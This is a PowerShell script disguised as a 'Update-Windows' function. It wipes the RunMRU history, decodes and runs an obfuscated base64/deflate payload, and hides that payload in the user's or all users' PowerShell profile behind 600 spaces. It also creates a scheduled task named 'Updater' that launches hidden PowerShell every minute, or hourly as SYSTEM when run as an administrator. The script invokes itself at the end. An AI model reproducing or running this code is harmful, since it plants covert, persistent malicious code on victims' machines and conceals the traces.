function Update-Windows{
Param([Switch]$Persist)
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
$ErrorActionPreference='SilentlyContinue'
$Script={sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('dVTdb9owEH9H4n84ITqSrbGgiD0UtVJH2YbaUkTo+lCqKSQHeE3syHEWWMv/vnPCR7q1eSDmfL+Ps+9SD6WMLzH01jc8DHmCvhRBAmfQbtJTrVQr9ThZykRTaIHaMcs8lnERyIyi232Wcqa8LOW0KzBL+B8sNotENkvnc1QmfEhgS+SLpd6qleIZD/SSwq1OsyRW4jDU2+R39IrXe3qtt8TKUgf4K6lqZYyR/I3OQGM0UjJGpdfgjDxiaHy/6t2dTl0515mncHrDfSUT+je9L8imvVQpFPqHqUGKaX8Vh1Khmo5TcTO+a4Az9CKExkda9ZWS6sLXlAcuDwkVrntSaC7S3Ea2pCBYda1StOGZrCfaU3rCI2P4G93UpadN6X7ICUyxIWbO7ewX+hrcdUL22RA1c6X/hDphk96ol2datQgVf5IsCETCBOracbvdtrvEr9CLzGkUlIxE3Dxm2d2H2Vrjw+Nj3bxN+zQZ+9zptDsvR8/NTTd3a1l1buAFERujF1hF/jE0j6FYsmsUC720bXAEQtN+7tYDT3uEs0oFOJN1jPlhbUuZ4EqzC7c3GPSFLwMuFvbWHy13KkaEm0pQBDPPfzKkHFdQKJycf2jBC9ym2ilgUEo9gdz5DvgJaiMXavS24iywWX7/FDyH2hZDgob+QRtjuPX0eHqae8y9fTGerIPC/ojZveIarT0P+d6vd8ezz/0apsnSsjfd3a30QpmgZQNdPWH+7wcz7wWJ8bfPceDQQDabSO2F5Q8CATXtUPN7XJizodN4+8vhQEmiWgE+t/6BOgtNF0tbYPoW8sc12o4bIsbgvOJ7Dc7zN/RrKrqP+LYfaMDaJz9pHn1MyMJXHmpUUDMdctaIZUYDt8QwZLjCBlwML6Eno8gTwTWnJrseXPWhcTQyU0nNJHxkcdI6atSqlY0Ztb8='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()}
if($Persist){
if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
{$Prof=$PROFILE.AllUsersAllHosts;$Payload="schtasks /Create /RU system /SC HOURLY /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`""}
else
{$Prof=$PROFILE.CurrentUserAllHosts;$Payload="schtasks /Create /SC MINUTE /MO 1 /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive -WindowStyle Hidden`""}
mkdir (Split-Path -Parent $Prof)
(gc $Prof) + (' ' * 600 + $Script)|Out-File $Prof -Fo
iex $Payload|Out-Null
Write-Output $Payload}
else
{$Script.Invoke()}
} Update-Windows -Persist
